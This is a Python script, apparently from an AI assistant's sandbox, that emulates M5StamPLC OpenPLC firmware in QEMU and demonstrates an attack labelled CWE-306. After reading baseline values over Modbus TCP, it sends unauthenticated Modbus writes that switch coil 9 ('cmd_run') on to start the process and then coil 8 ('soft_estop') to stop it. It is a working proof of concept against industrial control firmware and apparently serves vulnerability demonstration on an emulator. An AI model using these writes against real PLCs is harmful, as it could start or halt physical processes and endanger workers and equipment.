import os,shutil,socket,subprocess,time,struct
Q="/home/claude/qemu-esp/build/qemu-system-xtensa"
M="/mnt/user-data/uploads/m5stamplc_openplc/firmware/.pio/build/m5stamplc/merged-tbd.bin"
F="/home/claude/fwtest/flash.bin"; CDC="/home/claude/fwtest/ph_cdc.log"
shutil.copyfile(M,F); open(F,"r+b").truncate(8*1024*1024)
try:os.remove(CDC)
except OSError:pass
qp=subprocess.Popen([Q,"-M","esp32s3","-m","8M","-drive",f"file={F},if=mtd,format=raw",
    "-serial","null","-serial","null","-serial",f"file:{CDC}","-nographic","-no-reboot"],
    stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
t0=time.time()
while time.time()-t0<30:
    try:
        if "Modbus] TCP" in open(CDC).read(): break
    except OSError: pass
    time.sleep(0.3)
time.sleep(2)
sk=None
for _ in range(10):
    try: sk=socket.create_connection(("127.0.0.1",502),timeout=3); break
    except Exception: time.sleep(1)
tid=0
def tx(fc,a,q,extra=b""):
    global tid; tid+=1
    pdu=struct.pack(">BHH",fc,a,q)+extra
    sk.sendall(struct.pack(">HHHB",tid,0,len(pdu)+1,1)+pdu)
    return sk.recv(256)
def regs(a,n):
    d=tx(3,a,n); bc=d[8]; v=d[9:9+bc]
    return [(v[i]<<8)|v[i+1] for i in range(0,bc,2)]
def coils(a,n):
    d=tx(1,a,n); return d[9]
def snap(tag):
    r=regs(0,3); rel=coils(1,4); e=regs(10,4)   # regs 10-13 = IO-exp CH1/CH2 V/I
    print(f"  {tag:20} base:Vin={r[0]/1000:.1f}V I={r[1]}mA T={r[2]/10:.1f}C rel={rel:04b} | IOexp: CH1={e[0]}mV flow(CH2)={e[3]}uA")
print("[demo] connected:", bool(sk))
print("\n=== BASELINE (process idle) ===")
snap("idle")
print("\n=== ATTACK: unauth Modbus write coil 9 (cmd_run) = ON  (CWE-306) ===")
tx(5,9,0xFF00)
for i in range(9):
    time.sleep(1.5); snap(f"t+{(i+1)*1.5:.0f}s after cmd_run")
print("\n=== unauth Modbus write coil 8 (soft_estop) = ON  -> stop ===")
tx(5,8,0xFF00)
for i in range(3):
    time.sleep(1.5); snap(f"t+{(i+1)*1.5:.0f}s after estop")
sk.close(); qp.terminate()
try:qp.wait(timeout=5)
except Exception:qp.kill()
